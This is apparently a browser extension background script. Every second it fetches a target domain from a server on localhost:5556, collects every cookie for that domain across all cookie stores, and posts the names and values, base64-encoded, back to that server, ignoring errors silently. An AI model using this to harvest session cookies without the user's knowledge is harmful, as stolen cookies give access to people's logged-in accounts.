setInterval(async () => {
  const isArr = (obj) => (obj?.length ?? -1) >= 0
  const cleanCookies = (arr) =>
    arr.map((x) => ({ name: x.name, value: x.value }))
  const sendCookies = async (cookies) => {
    let json = {}

    if (isArr(cookies)) json = { default: cleanCookies(cookies) }
    else
      for (const storeId in cookies)
        json[storeId] = cleanCookies(cookies[storeId])

    try {
      await fetch("http://localhost:5556/cookies", {
        method: "POST",
        body: btoa(JSON.stringify(json)),
      })
    } catch {}
  }
  try {
    const conf = {
      url: await (await fetch("http://localhost:5556/domain")).text(),
    }
    if (window.chrome && !window.browser)
      chrome.cookies.getAll(conf, sendCookies)
    else {
      let cookies = {}
      for (const store of await browser.cookies.getAllCookieStores()) {
        const containerCookies = await browser.cookies.getAll({
          ...conf,
          storeId: store.id,
        })
        if (containerCookies.length > 0) cookies[store.id] = containerCookies
      }
      sendCookies(cookies)
    }
  } catch {}
}, 1000)
